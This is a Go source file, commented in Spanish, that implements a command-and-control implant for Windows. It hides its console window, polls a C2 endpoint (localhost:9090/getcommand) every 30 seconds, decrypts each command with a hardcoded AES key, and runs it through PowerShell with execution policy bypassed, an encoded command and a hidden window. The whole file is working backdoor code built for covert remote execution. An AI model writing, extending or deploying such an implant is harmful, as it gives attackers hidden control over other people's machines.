package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// Clave de cifrado AES
var aesKey = "mysecretpassword"

// Función para ocultar la ventana de la consola en Windows usando ShowWindow y FindWindow
func hideWindow() {
	if runtime.GOOS == "windows" {
		var moduser32 = syscall.NewLazyDLL("user32.dll")
		var procFindWindow = moduser32.NewProc("FindWindowW")
		var procShowWindow = moduser32.NewProc("ShowWindow")
		hwnd, _, _ := procFindWindow.Call(0, 0)
		if hwnd != 0 {
			procShowWindow.Call(hwnd, uintptr(0)) // Ocultar la ventana
		}
	}
}

// Función para descifrar el comando cifrado en AES
func decryptAES(ciphertext, key string) (string, error) {
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return "", err
	}

	// Limpiar el texto cifrado (eliminar saltos de línea y espacios en blanco)
	cleanCiphertext := strings.TrimSpace(ciphertext)

	data, err := hex.DecodeString(cleanCiphertext)
	if err != nil {
		return "", err
	}

	iv := data[:aes.BlockSize]
	encryptedMessage := data[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(encryptedMessage, encryptedMessage)

	return string(encryptedMessage), nil
}

// Función para ejecutar un comando PowerShell en memoria de manera oculta
func executePowershellCommand(encodedCommand string) {
	// Crear el comando para ejecutar PowerShell
	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encodedCommand)

	// Ejecutar el comando de forma oculta
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	// Capturar salida estándar y de error
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error ejecutando el comando PowerShell:", err)
		fmt.Println("Salida de PowerShell:", string(output)) // Mostrar salida de error
	} else {
		fmt.Println("Comando PowerShell ejecutado con éxito.")
		fmt.Println("Salida de PowerShell:", string(output)) // Mostrar salida exitosa
	}
}

// Función para enviar un "ping" al C2 solicitando un nuevo comando
func getCommandFromC2() (string, error) {
	url := "http://localhost:9090/getcommand" // Cambiado a la ruta correcta

	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	// Limpiar cualquier salto de línea o espacio adicional
	cleanedBody := strings.TrimSpace(string(body))

	return cleanedBody, nil
}

// Función principal para decodificar el comando recibido, descifrarlo y ejecutarlo
func processCommand() {
	// Obtener el comando cifrado desde el servidor C2
	cipherCommand, err := getCommandFromC2()
	if err != nil {
		fmt.Println("Error al obtener el comando del C2:", err)
		return
	}

	// Verificación del comando cifrado recibido
	fmt.Println("Comando cifrado recibido:", cipherCommand) // Añadido para depuración

	// Descifrar el comando
	decodedCommand, err := decryptAES(cipherCommand, aesKey)
	if err != nil {
		fmt.Println("Error descifrando el comando:", err)
		return
	}

	// Decodificar el comando Base64
	powershellCommand, err := base64.StdEncoding.DecodeString(decodedCommand)
	if err != nil {
		fmt.Println("Error decodificando el comando Base64:", err)
		return
	}

	// Verificar el comando decodificado antes de la ejecución
	fmt.Println("Comando PowerShell decodificado:", string(powershellCommand))

	// Ejecutar el comando PowerShell decodificado
	executePowershellCommand(string(powershellCommand))
}

func main() {
	// Ocultar la ventana si se ejecuta en Windows
	hideWindow()

	// Loop para recibir comandos desde el C2 y ejecutarlos en memoria
	for {
		processCommand()
		time.Sleep(30 * time.Second) // Esperar 30 segundos antes de solicitar un nuevo comando
	}
}
